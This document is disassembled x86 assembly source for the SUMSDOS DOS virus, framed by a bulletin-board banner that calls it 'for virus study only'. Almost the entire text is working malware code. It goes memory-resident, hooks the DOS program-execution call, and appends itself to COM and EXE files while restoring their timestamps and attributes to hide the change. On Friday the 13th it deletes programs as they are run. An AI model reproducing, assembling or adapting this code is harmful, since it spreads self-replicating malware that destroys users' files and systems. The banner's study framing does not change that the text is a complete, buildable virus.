;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;
  
PAGE  60,132
  
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл								         лл
;лл			        SUMSDOS				         лл
;лл								         лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
  
DATA_1E		EQU	2CH				; (0000:002C=0FF23H)
DATA_2E		EQU	43H				; (3E00:0043=0FFFFH)
DATA_3E		EQU	45H				; (3E00:0045=0FFFFH)
DATA_4E		EQU	47H				; (3E00:0047=0FFFFH)
DATA_5E		EQU	49H				; (3E00:0049=0FFFFH)
DATA_6E		EQU	51H				; (3E00:0051=0FFFFH)
DATA_7E		EQU	53H				; (3E00:0053=0FFFFH)
DATA_8E		EQU	57H				; (3E00:0057=0FFFFH)
DATA_9E		EQU	5DH				; (3E00:005D=0FFFFH)
DATA_10E	EQU	5FH				; (3E00:005F=0FFFFH)
DATA_11E	EQU	61H				; (3E00:0061=0FFFFH)
DATA_12E	EQU	63H				; (3E00:0063=0FFFFH)
DATA_13E	EQU	65H				; (3E00:0065=0FFFFH)
DATA_14E	EQU	78H				; (3E00:0078=0FFFFH)
DATA_15E	EQU	7AH				; (3E00:007A=0FFFFH)
DATA_16E	EQU	7CH				; (3E00:007C=0FFFFH)
DATA_17E	EQU	7EH				; (3E00:007E=0FFFFH)
DATA_18E	EQU	0AH				; (6CAF:000A=0)
DATA_19E	EQU	0CH				; (6CAF:000C=0)
DATA_20E	EQU	0EH				; (6CAF:000E=0)
DATA_21E	EQU	0FH				; (6CAF:000F=0)
DATA_22E	EQU	11H				; (6CAF:0011=0)
DATA_23E	EQU	13H				; (6CAF:0013=0)
DATA_24E	EQU	15H				; (6CAF:0015=0)
DATA_25E	EQU	17H				; (6CAF:0017=0)
DATA_26E	EQU	19H				; (6CAF:0019=0)
DATA_27E	EQU	1BH				; (6CAF:001B=0)
DATA_28E	EQU	1DH				; (6CAF:001D=0)
DATA_29E	EQU	1FH				; (6CAF:001F=0)
DATA_30E	EQU	29H				; (6CAF:0029=0)
DATA_31E	EQU	2BH				; (6CAF:002B=0)
DATA_32E	EQU	2DH				; (6CAF:002D=0)
DATA_33E	EQU	2FH				; (6CAF:002F=0)
DATA_34E	EQU	31H				; (6CAF:0031=0)
DATA_35E	EQU	33H				; (6CAF:0033=0)
DATA_36E	EQU	4EH				; (6CAF:004E=0)
DATA_37E	EQU	70H				; (6CAF:0070=0)
DATA_38E	EQU	72H				; (6CAF:0072=0)
DATA_39E	EQU	74H				; (6CAF:0074=0)
DATA_40E	EQU	76H				; (6CAF:0076=0)
DATA_41E	EQU	7AH				; (6CAF:007A=0)
DATA_42E	EQU	80H				; (6CAF:0080=0)
DATA_43E	EQU	82H				; (6CAF:0082=0)
DATA_44E	EQU	8FH				; (6CAF:008F=0)
  
CODESEG		SEGMENT
		ASSUME	CS:CODESEG, DS:CODESEG
  
  
		ORG	100h
  
sumsdos		PROC	FAR
  
start:
		JMP	LOC_2
		DB	73H, 55H, 4DH, 73H, 44H, 6FH
		DB	73H, 0, 1, 0BCH, 17H, 0
		DB	0, 0, 5, 0, 2BH, 2
		DB	70H, 0, 6EH, 6, 20H, 0BH
		DB	0EBH, 4, 14H, 0AH, 92H, 7BH
		DB	0
		DB	12 DUP (0)
		DB	0E8H, 6, 0ECH, 37H, 17H, 80H
		DB	0, 0, 0, 80H, 0, 37H
		DB	17H, 5CH, 0, 37H, 17H, 6CH
		DB	0, 37H, 17H, 10H, 7, 4CH
		DB	72H, 0C5H, 0, 4CH, 72H, 0
		DB	0F0H, 46H, 0, 4DH, 5AH, 60H
		DB	0, 0CEH, 2, 9FH, 26H, 0C0H
		DB	9, 7, 0, 7, 0, 75H
		DB	4FH, 10H, 7, 84H, 19H, 0C5H
		DB	0, 75H, 4FH, 1EH, 0, 0
		DB	0, 0B8H, 0, 4CH, 0CDH, 21H
		DB	5, 0, 20H, 0, 49H, 13H
		DB	91H, 0B3H, 0, 2, 10H, 0
		DB	50H, 93H, 5, 0, 5BH, 3DH
		DB	70H, 0ABH
		DB	'COMMAND.COM'
		DB	1, 0, 0, 0, 0, 0
LOC_2:
		CLD					; Clear direction
		MOV	AH,0E0H
		INT	21H				; DOS Services  ah=function E0h
		CMP	AH,0E0H
		JAE	LOC_3				; Jump if above or =
		CMP	AH,3
		JB	LOC_3				; Jump if below
		MOV	AH,0DDH
		MOV	DI,100H
		MOV	SI,710H
		ADD	SI,DI
		MOV	CX,CS:[DI+11H]
		INT	21H				; DOS Services  ah=function DDh
LOC_3:
		MOV	AX,CS
		ADD	AX,10H
		MOV	SS,AX
		MOV	SP,700H
		PUSH	AX
		MOV	AX,0C5H
		PUSH	AX
		RET					; Return far
		DB	0FCH, 6, 2EH, 8CH, 6, 31H
		DB	0, 2EH, 8CH, 6, 39H, 0
		DB	2EH, 8CH, 6, 3DH, 0, 2EH
		DB	8CH, 6, 41H, 0, 8CH, 0C0H
		DB	5, 10H, 0, 2EH, 1, 6
		DB	49H, 0, 2EH, 1, 6, 45H
		DB	0, 0B4H, 0E0H, 0CDH, 21H, 80H
		DB	0FCH, 0E0H, 73H, 13H, 80H, 0FCH
		DB	3, 7, 2EH, 8EH, 16H, 45H
		DB	0, 2EH, 8BH, 26H, 43H, 0
		DB	2EH, 0FFH, 2EH, 47H, 0, 33H
		DB	0C0H, 8EH, 0C0H, 26H, 0A1H, 0FCH
		DB	3, 2EH, 0A3H, 4BH, 0, 26H
		DB	0A0H, 0FEH, 3, 2EH, 0A2H, 4DH
		DB	0
		DB	26H
  
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;
;			External Entry Point
;
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
  
int_24h_entry	PROC	FAR
		MOV	DATA_46,0A5F3H			; (6CAF:03FC=29H)
		MOV	ES:DATA_47,0CBH			; (6CAF:03FE=2EH)
		POP	AX
		ADD	AX,10H
		MOV	ES,AX
		PUSH	CS
		POP	DS
		MOV	CX,710H
		SHR	CX,1				; Shift w/zeros fill
		XOR	SI,SI				; Zero register
		MOV	DI,SI
		PUSH	ES
		MOV	AX,142H
		PUSH	AX
		JMP	FAR PTR LOC_1
		DB	8CH, 0C8H, 8EH, 0D0H, 0BCH, 0
		DB	7, 33H, 0C0H, 8EH, 0D8H, 2EH
		DB	0A1H, 4BH, 0, 0A3H, 0FCH, 3
		DB	2EH, 0A0H, 4DH, 0, 0A2H, 0FEH
		DB	3
int_24h_entry	ENDP
  
  
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;
;			External Entry Point
;
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
  
int_21h_entry	PROC	FAR
		MOV	BX,SP
		MOV	CL,4
		SHR	BX,CL				; Shift w/zeros fill
		ADD	BX,10H
		MOV	CS:DATA_35E,BX			; (6CAF:0033=0)
		MOV	AH,4AH				; 'J'
		MOV	ES,CS:DATA_34E			; (6CAF:0031=0)
		INT	21H				; DOS Services  ah=function 4Ah
							;  change mem allocation, bx=siz
		MOV	AX,3521H
		INT	21H				; DOS Services  ah=function 35h
							;  get intrpt vector al in es:bx
		MOV	CS:DATA_25E,BX			; (6CAF:0017=0)
		MOV	CS:DATA_26E,ES			; (6CAF:0019=0)
		PUSH	CS
		POP	DS
		MOV	DX,25BH
		MOV	AX,2521H
		INT	21H				; DOS Services  ah=function 25h
							;  set intrpt vector al to ds:dx
		MOV	ES,DS:DATA_34E			; (6CAF:0031=0)
		MOV	ES,ES:DATA_1E			; (0000:002C=0FF23H)
		XOR	DI,DI				; Zero register
		MOV	CX,7FFFH
		XOR	AL,AL				; Zero register
  
LOCLOOP_5:
		REPNE	SCASB				; Rept zf=0+cx>0 Scan es:[di] for al
		CMP	ES:[DI],AL
		LOOPNZ	LOCLOOP_5			; Loop if zf=0, cx>0
  
		MOV	DX,DI
		ADD	DX,3
		MOV	AX,4B00H
		PUSH	ES
		POP	DS
		PUSH	CS
		POP	ES
		MOV	BX,35H
		PUSH	DS
		PUSH	ES
		PUSH	AX
		PUSH	BX
		PUSH	CX
		PUSH	DX
		MOV	AH,2AH				; '*'
		INT	21H				; DOS Services  ah=function 2Ah
							;  get date, cx=year, dx=mon/day
		MOV	BYTE PTR CS:DATA_20E,0		; (6CAF:000E=0)
		CMP	CX,7C3H
		JE	LOC_7				; Jump if equal
		CMP	AL,5
		JNE	LOC_6				; Jump if not equal
		CMP	DL,0DH
		JNE	LOC_6				; Jump if not equal
		INC	BYTE PTR CS:DATA_20E		; (6CAF:000E=0)
		JMP	SHORT LOC_7
		DB	90H
LOC_6:
		MOV	AX,3508H
		INT	21H				; DOS Services  ah=function 35h
							;  get intrpt vector al in es:bx
		MOV	CS:DATA_23E,BX			; (6CAF:0013=0)
		MOV	CS:DATA_24E,ES			; (6CAF:0015=0)
		PUSH	CS
		POP	DS
		MOV	WORD PTR DS:DATA_29E,7E90H	; (6CAF:001F=0)
		MOV	AX,2508H
		MOV	DX,21EH
		INT	21H				; DOS Services  ah=function 25h
							;  set intrpt vector al to ds:dx
LOC_7:
		POP	DX
		POP	CX
		POP	BX
		POP	AX
		POP	ES
		POP	DS
		PUSHF					; Push flags
		CALL	DWORD PTR CS:DATA_25E		; (6CAF:0017=0)
		PUSH	DS
		POP	ES
		MOV	AH,49H				; 'I'
		INT	21H				; DOS Services  ah=function 49h
							;  release memory block, es=seg
		MOV	AH,4DH				; 'M'
		INT	21H				; DOS Services  ah=function 4Dh
							;  get return code info in ax
		MOV	AH,31H				; '1'
		MOV	DX,600H
		MOV	CL,4
		SHR	DX,CL				; Shift w/zeros fill
		ADD	DX,10H
		INT	21H				; DOS Services  ah=function 31h
							;  terminate & stay resident
		DB	32H, 0C0H, 0CFH, 2EH, 83H, 3EH
		DB	1FH, 0, 2, 75H, 17H, 50H
		DB	53H, 51H, 52H, 55H, 0B8H, 2
		DB	6, 0B7H, 87H, 0B9H, 5, 5
		DB	0BAH, 10H, 10H, 0CDH, 10H, 5DH
		DB	5AH, 59H, 5BH, 58H, 2EH, 0FFH
		DB	0EH, 1FH, 0, 75H, 12H, 2EH
		DB	0C7H, 6, 1FH, 0, 1, 0
		DB	50H, 51H, 56H, 0B9H, 1, 40H
		DB	0F3H, 0ACH, 5EH, 59H, 58H, 2EH
		DB	0FFH, 2EH, 13H, 0, 9CH, 80H
		DB	0FCH, 0E0H, 75H, 5, 0B8H, 0
		DB	3, 9DH, 0CFH, 80H, 0FCH, 0DDH
		DB	74H, 13H, 80H, 0FCH, 0DEH, 74H
		DB	28H, 3DH, 0, 4BH, 75H, 3
		DB	0E9H, 0B4H, 0
LOC_8:
		POPF					; Pop flags
		JMP	DWORD PTR CS:DATA_25E		; (6CAF:0017=0)
LOC_9:
		POP	AX
		POP	AX
		MOV	AX,100H
		MOV	CS:DATA_18E,AX			; (6CAF:000A=0)
		POP	AX
		MOV	CS:DATA_19E,AX			; (6CAF:000C=0)
		REP	MOVSB				; Rep while cx>0 Mov [si] to es:[di]
		POPF					; Pop flags
		MOV	AX,CS:DATA_21E			; (6CAF:000F=0)
		JMP	DWORD PTR CS:DATA_18E		; (6CAF:000A=0)
LOC_10:
		ADD	SP,6
		POPF					; Pop flags
		MOV	AX,CS
		MOV	SS,AX
		MOV	SP,710H
		PUSH	ES
		PUSH	ES
		XOR	DI,DI				; Zero register
		PUSH	CS
		POP	ES
		MOV	CX,10H
		MOV	SI,BX
		MOV	DI,21H
		REP	MOVSB				; Rep while cx>0 Mov [si] to es:[di]
		MOV	AX,DS
		MOV	ES,AX
		MUL	WORD PTR CS:DATA_41E		; (6CAF:007A=0) ax = data * ax
		ADD	AX,CS:DATA_31E			; (6CAF:002B=0)
		ADC	DX,0
		DIV	WORD PTR CS:DATA_41E		; (6CAF:007A=0) ax,dxrem=dx:ax/data
		MOV	DS,AX
		MOV	SI,DX
		MOV	DI,DX
		MOV	BP,ES
		MOV	BX,CS:DATA_33E			; (6CAF:002F=0)
		OR	BX,BX				; Zero ?
		JZ	LOC_12				; Jump if zero
LOC_11:
		MOV	CX,8000H
		REP	MOVSW				; Rep while cx>0 Mov [si] to es:[di]
		ADD	AX,1000H
		ADD	BP,1000H
		MOV	DS,AX
		MOV	ES,BP
		DEC	BX
		JNZ	LOC_11				; Jump if not zero
LOC_12:
		MOV	CX,CS:DATA_32E			; (6CAF:002D=0)
		REP	MOVSB				; Rep while cx>0 Mov [si] to es:[di]
		POP	AX
		PUSH	AX
		ADD	AX,10H
		ADD	CS:DATA_30E,AX			; (6CAF:0029=0)
DATA_47		DB	2EH
		DB	1, 6, 25H, 0, 2EH, 0A1H
		DB	21H, 0, 1FH, 7, 2EH, 8EH
		DB	16H, 29H, 0, 2EH, 8BH, 26H
		DB	27H, 0, 2EH, 0FFH, 2EH, 23H
		DB	0
LOC_13:
		XOR	CX,CX				; Zero register
		MOV	AX,4301H
		INT	21H				; DOS Services  ah=function 43h
							;  get/set file attrb, nam@ds:dx
		MOV	AH,41H				; 'A'
		INT	21H				; DOS Services  ah=function 41h
							;  delete file, name @ ds:dx
		MOV	AX,4B00H
		POPF					; Pop flags
		JMP	DWORD PTR CS:DATA_25E		; (6CAF:0017=0)
LOC_14:
		CMP	BYTE PTR CS:DATA_20E,1		; (6CAF:000E=0)
		JE	LOC_13				; Jump if equal
		MOV	WORD PTR CS:DATA_37E,0FFFFH	; (6CAF:0070=0)
		MOV	WORD PTR CS:DATA_44E,0		; (6CAF:008F=0)
		MOV	CS:DATA_42E,DX			; (6CAF:0080=0)
		MOV	CS:DATA_43E,DS			; (6CAF:0082=0)
		PUSH	AX
		PUSH	BX
		PUSH	CX
		PUSH	DX
		PUSH	SI
		PUSH	DI
		PUSH	DS
		PUSH	ES
		CLD					; Clear direction
		MOV	DI,DX
		XOR	DL,DL				; Zero register
		CMP	BYTE PTR [DI+1],3AH		; ':'
		JNE	LOC_15				; Jump if not equal
		MOV	DL,[DI]
		AND	DL,1FH
LOC_15:
		MOV	AH,36H				; '6'
		INT	21H				; DOS Services  ah=function 36h
							;  get free space, drive dl,1=a:
		CMP	AX,0FFFFH
		JNE	LOC_17				; Jump if not equal
LOC_16:
		JMP	LOC_43
LOC_17:
		MUL	BX				; dx:ax = reg * ax
		MUL	CX				; dx:ax = reg * ax
		OR	DX,DX				; Zero ?
		JNZ	LOC_18				; Jump if not zero
		CMP	AX,710H
		JB	LOC_16				; Jump if below
LOC_18:
		MOV	DX,CS:DATA_42E			; (6CAF:0080=0)
		PUSH	DS
		POP	ES
		XOR	AL,AL				; Zero register
		MOV	CX,41H
		REPNE	SCASB				; Rept zf=0+cx>0 Scan es:[di] for al
		MOV	SI,CS:DATA_42E			; (6CAF:0080=0)
LOC_19:
		MOV	AL,[SI]
		OR	AL,AL				; Zero ?
		JZ	LOC_21				; Jump if zero
		CMP	AL,61H				; 'a'
		JB	LOC_20				; Jump if below
		CMP	AL,7AH				; 'z'
		JA	LOC_20				; Jump if above
		SUB	BYTE PTR [SI],20H		; ' '
LOC_20:
		INC	SI
		JMP	SHORT LOC_19
LOC_21:
		MOV	CX,0BH
		SUB	SI,CX
		MOV	DI,84H
		PUSH	CS
		POP	ES
		MOV	CX,0BH
		REPE	CMPSB				; Rept zf=1+cx>0 Cmp [si] to es:[di]
		JNZ	LOC_22				; Jump if not zero
		JMP	LOC_43
LOC_22:
		MOV	AX,4300H
		INT	21H				; DOS Services  ah=function 43h
							;  get/set file attrb, nam@ds:dx
		JC	LOC_23				; Jump if carry Set
		MOV	CS:DATA_38E,CX			; (6CAF:0072=0)
LOC_23:
		JC	LOC_25				; Jump if carry Set
		XOR	AL,AL				; Zero register
		MOV	CS:DATA_36E,AL			; (6CAF:004E=0)
		PUSH	DS
		POP	ES
		MOV	DI,DX
		MOV	CX,41H
		REPNE	SCASB				; Rept zf=0+cx>0 Scan es:[di] for al
		CMP	BYTE PTR [DI-2],4DH		; 'M'
		JE	LOC_24				; Jump if equal
		CMP	BYTE PTR [DI-2],6DH		; 'm'
		JE	LOC_24				; Jump if equal
		INC	BYTE PTR CS:DATA_36E		; (6CAF:004E=0)
LOC_24:
		MOV	AX,3D00H
		INT	21H				; DOS Services  ah=function 3Dh
							;  open file, al=mode,name@ds:dx
LOC_25:
		JC	LOC_27				; Jump if carry Set
		MOV	CS:DATA_37E,AX			; (6CAF:0070=0)
		MOV	BX,AX
		MOV	AX,4202H
		MOV	CX,0FFFFH
		MOV	DX,0FFFBH
		INT	21H				; DOS Services  ah=function 42h
							;  move file ptr, cx,dx=offset
		JC	LOC_25				; Jump if carry Set
		ADD	AX,5
		MOV	CS:DATA_22E,AX			; (6CAF:0011=0)
		MOV	CX,5
		MOV	DX,6BH
		MOV	AX,CS
		MOV	DS,AX
		MOV	ES,AX
		MOV	AH,3FH				; '?'
		INT	21H				; DOS Services  ah=function 3Fh
							;  read file, cx=bytes, to ds:dx
		MOV	DI,DX
		MOV	SI,5
		REPE	CMPSB				; Rept zf=1+cx>0 Cmp [si] to es:[di]
		JNZ	LOC_26				; Jump if not zero
		MOV	AH,3EH				; '>'
		INT	21H				; DOS Services  ah=function 3Eh
							;  close file, bx=file handle
		JMP	LOC_43
LOC_26:
		MOV	AX,3524H
		INT	21H				; DOS Services  ah=function 35h
							;  get intrpt vector al in es:bx
		MOV	DS:DATA_27E,BX			; (6CAF:001B=0)
		MOV	DS:DATA_28E,ES			; (6CAF:001D=0)
		MOV	DX,21BH
		MOV	AX,2524H
		INT	21H				; DOS Services  ah=function 25h
							;  set intrpt vector al to ds:dx
		LDS	DX,DWORD PTR DS:DATA_42E	; (6CAF:0080=0) Load 32 bit ptr
		XOR	CX,CX				; Zero register
		MOV	AX,4301H
		INT	21H				; DOS Services  ah=function 43h
							;  get/set file attrb, nam@ds:dx
LOC_27:
		JC	LOC_28				; Jump if carry Set
		MOV	BX,CS:DATA_37E			; (6CAF:0070=0)
		MOV	AH,3EH				; '>'
		INT	21H				; DOS Services  ah=function 3Eh
							;  close file, bx=file handle
		MOV	WORD PTR CS:DATA_37E,0FFFFH	; (6CAF:0070=0)
		MOV	AX,3D02H
		INT	21H				; DOS Services  ah=function 3Dh
							;  open file, al=mode,name@ds:dx
		JC	LOC_28				; Jump if carry Set
		MOV	CS:DATA_37E,AX			; (6CAF:0070=0)
		MOV	AX,CS
		MOV	DS,AX
		MOV	ES,AX
		MOV	BX,DS:DATA_37E			; (6CAF:0070=0)
		MOV	AX,5700H
		INT	21H				; DOS Services  ah=function 57h
							;  get/set file date & time
		MOV	DS:DATA_39E,DX			; (6CAF:0074=0)
		MOV	DS:DATA_40E,CX			; (6CAF:0076=0)
		MOV	AX,4200H
		XOR	CX,CX				; Zero register
		MOV	DX,CX
		INT	21H				; DOS Services  ah=function 42h
							;  move file ptr, cx,dx=offset
LOC_28:
		JC	LOC_31				; Jump if carry Set
		CMP	BYTE PTR DS:DATA_36E,0		; (6CAF:004E=0)
		JE	LOC_29				; Jump if equal
		JMP	SHORT LOC_33
		DB	90H
LOC_29:
		MOV	BX,1000H
		MOV	AH,48H				; 'H'
		INT	21H				; DOS Services  ah=function 48h
							;  allocate memory, bx=bytes/16
		JNC	LOC_30				; Jump if carry=0
		MOV	AH,3EH				; '>'
		MOV	BX,DS:DATA_37E			; (6CAF:0070=0)
		INT	21H				; DOS Services  ah=function 3Eh
							;  close file, bx=file handle
		JMP	LOC_43
LOC_30:
		INC	WORD PTR DS:DATA_44E		; (6CAF:008F=0)
		MOV	ES,AX
		XOR	SI,SI				; Zero register
		MOV	DI,SI
		MOV	CX,710H
		REP	MOVSB				; Rep while cx>0 Mov [si] to es:[di]
		MOV	DX,DI
		MOV	CX,DS:DATA_22E			; (6CAF:0011=0)
		MOV	BX,DS:DATA_37E			; (6CAF:0070=0)
		PUSH	ES
		POP	DS
		MOV	AH,3FH				; '?'
		INT	21H				; DOS Services  ah=function 3Fh
							;  read file, cx=bytes, to ds:dx
LOC_31:
		JC	LOC_32				; Jump if carry Set
		ADD	DI,CX
		XOR	CX,CX				; Zero register
		MOV	DX,CX
		MOV	AX,4200H
		INT	21H				; DOS Services  ah=function 42h
							;  move file ptr, cx,dx=offset
		MOV	SI,5
		MOV	CX,5
		DB	0F3H, 2EH, 0A4H, 8BH, 0CFH, 33H
		DB	0D2H, 0B4H, 40H, 0CDH
		DB	21H
LOC_32:
		JC	LOC_34				; Jump if carry Set
		JMP	LOC_41
LOC_33:
		MOV	CX,1CH
		MOV	DX,4FH
		MOV	AH,3FH				; '?'
		INT	21H				; DOS Services  ah=function 3Fh
							;  read file, cx=bytes, to ds:dx
LOC_34:
		JC	LOC_36				; Jump if carry Set
		MOV	WORD PTR DS:DATA_11E,1984H	; (3E00:0061=0FFFFH)
		MOV	AX,DS:DATA_9E			; (3E00:005D=0FFFFH)
		MOV	DS:DATA_3E,AX			; (3E00:0045=0FFFFH)
		MOV	AX,DS:DATA_10E			; (3E00:005F=0FFFFH)
		MOV	DS:DATA_2E,AX			; (3E00:0043=0FFFFH)
		MOV	AX,DS:DATA_12E			; (3E00:0063=0FFFFH)
		MOV	DS:DATA_4E,AX			; (3E00:0047=0FFFFH)
		MOV	AX,DS:DATA_13E			; (3E00:0065=0FFFFH)
		MOV	DS:DATA_5E,AX			; (3E00:0049=0FFFFH)
		MOV	AX,DS:DATA_7E			; (3E00:0053=0FFFFH)
		CMP	WORD PTR DS:DATA_6E,0		; (3E00:0051=0FFFFH)
		JE	LOC_35				; Jump if equal
		DEC	AX
LOC_35:
		MUL	WORD PTR DS:DATA_14E		; (3E00:0078=0FFFFH) ax = data * ax
		ADD	AX,DS:DATA_6E			; (3E00:0051=0FFFFH)
		ADC	DX,0
		ADD	AX,0FH
		ADC	DX,0
		AND	AX,0FFF0H
		MOV	DS:DATA_16E,AX			; (3E00:007C=0FFFFH)
		MOV	DS:DATA_17E,DX			; (3E00:007E=0FFFFH)
		ADD	AX,710H
		ADC	DX,0
LOC_36:
		JC	LOC_38				; Jump if carry Set
		DIV	WORD PTR DS:DATA_14E		; (3E00:0078=0FFFFH) ax,dxrem=dx:ax/da
		OR	DX,DX				; Zero ?
		JZ	LOC_37				; Jump if zero
		INC	AX
LOC_37:
		MOV	DS:DATA_7E,AX			; (3E00:0053=0FFFFH)
		MOV	DS:DATA_6E,DX			; (3E00:0051=0FFFFH)
		MOV	AX,DS:DATA_16E			; (3E00:007C=0FFFFH)
		MOV	DX,DS:DATA_17E			; (3E00:007E=0FFFFH)
		DIV	WORD PTR DS:DATA_15E		; (3E00:007A=0FFFFH) ax,dxrem=dx:ax/da
		SUB	AX,DS:DATA_8E			; (3E00:0057=0FFFFH)
		MOV	DS:DATA_13E,AX			; (3E00:0065=0FFFFH)
		MOV	WORD PTR DS:DATA_12E,0C5H	; (3E00:0063=0FFFFH)
		MOV	DS:DATA_9E,AX			; (3E00:005D=0FFFFH)
		MOV	WORD PTR DS:DATA_10E,710H	; (3E00:005F=0FFFFH)
		XOR	CX,CX				; Zero register
		MOV	DX,CX
		MOV	AX,4200H
		INT	21H				; DOS Services  ah=function 42h
							;  move file ptr, cx,dx=offset
LOC_38:
		JC	LOC_39				; Jump if carry Set
		MOV	CX,1CH
		MOV	DX,4FH
		MOV	AH,40H				; '@'
		INT	21H				; DOS Services  ah=function 40h
							;  write file cx=bytes, to ds:dx
LOC_39:
		JC	LOC_40				; Jump if carry Set
		CMP	AX,CX
		JNE	LOC_41				; Jump if not equal
		MOV	DX,DS:DATA_16E			; (3E00:007C=0FFFFH)
		MOV	CX,DS:DATA_17E			; (3E00:007E=0FFFFH)
		MOV	AX,4200H
		INT	21H				; DOS Services  ah=function 42h
							;  move file ptr, cx,dx=offset
LOC_40:
		JC	LOC_41				; Jump if carry Set
		XOR	DX,DX				; Zero register
		MOV	CX,710H
		MOV	AH,40H				; '@'
		INT	21H				; DOS Services  ah=function 40h
							;  write file cx=bytes, to ds:dx
LOC_41:
		CMP	WORD PTR CS:DATA_44E,0		; (6CAF:008F=0)
		JE	LOC_42				; Jump if equal
		MOV	AH,49H				; 'I'
		INT	21H				; DOS Services  ah=function 49h
							;  release memory block, es=seg
LOC_42:
		CMP	WORD PTR CS:DATA_37E,0FFFFH	; (6CAF:0070=0)
		JE	LOC_43				; Jump if equal
		MOV	BX,CS:DATA_37E			; (6CAF:0070=0)
		MOV	DX,CS:DATA_39E			; (6CAF:0074=0)
		MOV	CX,CS:DATA_40E			; (6CAF:0076=0)
		MOV	AX,5701H
		INT	21H				; DOS Services  ah=function 57h
							;  get/set file date & time
		MOV	AH,3EH				; '>'
		INT	21H				; DOS Services  ah=function 3Eh
							;  close file, bx=file handle
		LDS	DX,DWORD PTR CS:DATA_42E	; (6CAF:0080=0) Load 32 bit ptr
		MOV	CX,CS:DATA_38E			; (6CAF:0072=0)
		MOV	AX,4301H
		INT	21H				; DOS Services  ah=function 43h
							;  get/set file attrb, nam@ds:dx
		LDS	DX,DWORD PTR CS:DATA_27E	; (6CAF:001B=0) Load 32 bit ptr
		MOV	AX,2524H
		INT	21H				; DOS Services  ah=function 25h
							;  set intrpt vector al to ds:dx
LOC_43:
		POP	ES
		POP	DS
		POP	DI
		POP	SI
		POP	DX
		POP	CX
		POP	BX
		POP	AX
		POPF					; Pop flags
		JMP	DWORD PTR CS:DATA_25E		; (6CAF:0017=0)
		DB	11 DUP (0)
		DB	4DH, 14H, 0AH, 0, 10H
		DB	11 DUP (0)
		DB	0E9H, 92H, 0, 73H, 55H, 4DH
		DB	73H, 44H, 6FH, 73H, 0, 1
		DB	0BCH, 17H, 0, 0, 0, 5
		DB	0, 2BH, 2, 70H, 0, 6EH
		DB	6, 20H, 0BH, 0EBH, 4, 14H
		DB	0AH, 92H, 7BH, 0
		DB	12 DUP (0)
		DB	0E8H, 6, 0ECH, 37H, 17H, 80H
		DB	0, 0, 0, 80H, 0, 37H
		DB	17H, 5CH, 0, 37H, 17H, 6CH
		DB	0, 37H, 17H, 10H, 7, 4CH
		DB	72H, 0C5H, 0, 4CH, 72H, 0
		DB	0F0H, 46H, 0, 4DH, 5AH, 60H
		DB	0, 0CEH, 2, 9FH, 26H, 0C0H
		DB	9, 7, 0, 7, 0, 75H
		DB	4FH, 10H, 7, 84H, 19H, 0C5H
		DB	0, 75H, 4FH, 1EH, 0, 0
		DB	0, 0B8H, 0, 4CH, 0CDH, 21H
		DB	5, 0, 20H, 0, 49H, 13H
		DB	91H, 0B3H, 0, 2, 10H, 0
		DB	50H, 93H, 5, 0, 5BH, 3DH
		DB	70H, 0ABH
		DB	'COMMAND.COM'
		DB	1, 0, 0, 0, 0, 0
		DB	0FCH, 0B4H, 0E0H, 0CDH, 21H, 80H
		DB	0FCH, 0E0H, 73H, 16H, 80H, 0FCH
		DB	3, 72H, 11H, 0B4H, 0DDH, 0BFH
		DB	0, 1, 0BEH, 10H, 7, 3
		DB	0F7H, 2EH, 8BH, 8DH, 11H, 0
		DB	0CDH
		DB	21H
LOC_44:
		MOV	AX,CS
		ADD	AX,10H
		MOV	SS,AX
		MOV	SP,700H
		PUSH	AX
		MOV	AX,0C5H
		PUSH	AX
		RET					; Return far
int_21h_entry	ENDP
  
		DB	0FCH, 6, 2EH, 8CH, 6, 31H
		DB	0, 2EH, 8CH, 6, 39H, 0
		DB	2EH, 8CH, 6, 3DH, 0, 2EH
		DB	8CH, 6, 41H, 0, 8CH, 0C0H
		DB	5, 10H, 0, 2EH, 1, 6
		DB	49H, 0, 2EH, 1, 6, 45H
		DB	0, 0B4H, 0E0H, 0CDH, 21H, 80H
		DB	0FCH, 0E0H, 73H, 13H, 80H, 0FCH
		DB	3, 7, 2EH, 8EH, 16H, 45H
		DB	0, 2EH, 8BH, 26H, 43H, 0B8H
		DB	0, 4CH, 0CDH
		DB	21H, 4DH, 73H, 44H, 6FH, 73H
  
sumsdos		ENDP
  
CODESEG		ENDS
  
  
  
		END	START

;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
